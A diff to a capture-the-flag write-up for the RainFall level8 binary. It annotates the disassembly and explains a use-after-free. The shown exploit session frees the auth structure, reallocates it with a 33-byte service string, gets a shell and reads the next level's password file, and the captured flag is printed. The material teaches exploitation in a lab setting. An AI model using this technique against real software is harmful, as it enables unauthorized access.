@@ -3,6 +3,8 @@
 1. [Analysis](#analysis)
 2. [Exploit](#exploit)
 
+> Please note that due to a programming error, we can easily resolve this level without using the expected vulnerability, but we will act as if the binary worked as intended. The bug make the program to allocate the space of an address instead of a structure.
+
 ## Analysis
 
 We have an big `main` function:
@@ -36,26 +38,26 @@ Dump of assembler code for function main:
    0x080485bb <+87>:    lea    eax,[esp+0x20]                           ; eax = buffer
    0x080485bf <+91>:    mov    edx,eax                                  ; edx = eax
    0x080485c1 <+93>:    mov    eax,0x8048819                            ; eax = 'auth' address
-   0x080485c6 <+98>:    mov    ecx,0x5
-   0x080485cb <+103>:   mov    esi,edx
-   0x080485cd <+105>:   mov    edi,eax
-   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
-   0x080485d1 <+109>:   seta   dl
-   0x080485d4 <+112>:   setb   al
+   0x080485c6 <+98>:    mov    ecx,0x5                                  ; ecx = 5
+   0x080485cb <+103>:   mov    esi,edx                                  ; esi = edx (buffer)
+   0x080485cd <+105>:   mov    edi,eax                                  ; edi = eax ('auth')
+   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   ; while edi - esi = 0 && ecx > 0
+   0x080485d1 <+109>:   seta   dl                                       ; set dl byte to 1 if above 
+   0x080485d4 <+112>:   setb   al                                       ; set al byte to 1 if below
    0x080485d7 <+115>:   mov    ecx,edx
    0x080485d9 <+117>:   sub    cl,al
    0x080485db <+119>:   mov    eax,ecx
-   0x080485dd <+121>:   movsx  eax,al
-   0x080485e0 <+124>:   test   eax,eax
-   0x080485e2 <+126>:   jne    0x8048642 <main+222>
-   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4
-   0x080485eb <+135>:   call   0x8048470 <malloc@plt>
-   0x080485f0 <+140>:   mov    ds:0x8049aac,eax
-   0x080485f5 <+145>:   mov    eax,ds:0x8049aac
-   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0
-   0x08048600 <+156>:   lea    eax,[esp+0x20]
-   0x08048604 <+160>:   add    eax,0x5
-   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff
+   0x080485dd <+121>:   movsx  eax,al                                   ;
+   0x080485e0 <+124>:   test   eax,eax                                  ; check if eax == 0
+   0x080485e2 <+126>:   jne    0x8048642 <main+222>                     ; jump if not
+   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4                      ; load malloc arg (4)
+   0x080485eb <+135>:   call   0x8048470 <malloc@plt>                   ; malloc(4)
+   0x080485f0 <+140>:   mov    ds:0x8049aac,eax                         ; 'auth' = malloc return value
+   0x080485f5 <+145>:   mov    eax,ds:0x8049aac                         ; eax = 'auth' allocated address
+   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0                      ; eax 4 bytes content = 0
+   0x08048600 <+156>:   lea    eax,[esp+0x20]                           ; eax = buffer address
+   0x08048604 <+160>:   add    eax,0x5                                  ; eax = buffer[5]
+   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff          ; 
    0x0804860f <+171>:   mov    edx,eax
    0x08048611 <+173>:   mov    eax,0x0
    0x08048616 <+178>:   mov    ecx,DWORD PTR [esp+0x1c]
@@ -151,6 +153,37 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+After analysing how this executable works and rewriting the source code, we understand that we need to set the variable 'auth' of the structure 'auth' to a value other than 0 in order to execute the `system` call.
+
+The whole code of `main` is wrapped inside an infinite loop (such as `while (1)`), which prints two variable adresses, wait for a user input, then performs differents actions if the input begins by one theses commands : `auth `, `reset`, `service` or `login`. The input is read from stdin with `fgets`, avoiding a buffer overflow here.
+
+We notice two memory allocations, a `malloc` call for the 'auth' structure and a `strdup` of the 'service' variable. In the first one, `strcpy` is used to fill in the array of char of the 'auth' structure, but a `strlen` check prevents us again from exploiting a buffer overflow.
+
+Taking a closer look to the allocated pointers, we see that the `reset` command will free the structure 'auth', but dont set its pointer to 'NULL', keeping this address readable without any segfault . Indeed, we know that `free` will just set the memory block as 'free for use', according to the `malloc` implementation. After some researches , we find the kind of exploit we can use here, a 'use-after-free'.
+
 ## Exploit
 
-The common name for the exploit we are going to use is: _use-after-free_.
+The main goal of this exploit is to write on the memory space of the structure 'auth' to change the value of its variable 'auth' which is checked to allow the execution of `system`. Let's run the program and begin by allocating space to the 'auth' structure.
+
+```console
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth hackerman     # ^_^
+0x804a008, (nil)
+```
+
+The structure 'auth' is now allocated at the address `0x804a008`. We will try to free it with `reset`, then write on the same space using the `service` command that will call `strdup` to allocate space on the heap and copy the string we provide to it. We expect `malloc` to return the same address as previously (`0x804a008`) because we will `free` the block before.
+
+In order to overwrite the value of 'auth->auth', we need to send a string which is at least 33 bytes long : the 32 first bytes will overwrite the array of characters 'auth->name' and the 33rd the 'auth->auth' variable. Please note that the characters we send don't matter, all we need is a final value different from 0x00000000 at the address `0x804a008 + 32`.
+
+Last detail, we should not send more than 36 characters, otherwise the targeted memory block won't be large enough and `malloc` will allocate us some space from a different heap address. Why 36 ? Because this is the size of the 'auth' structure previously allocated. Now let's do this !
+
+```console
+reset
+0x804a008, (nil)
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a008    # the real output is different due to the bug mentioned at the top of this document
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
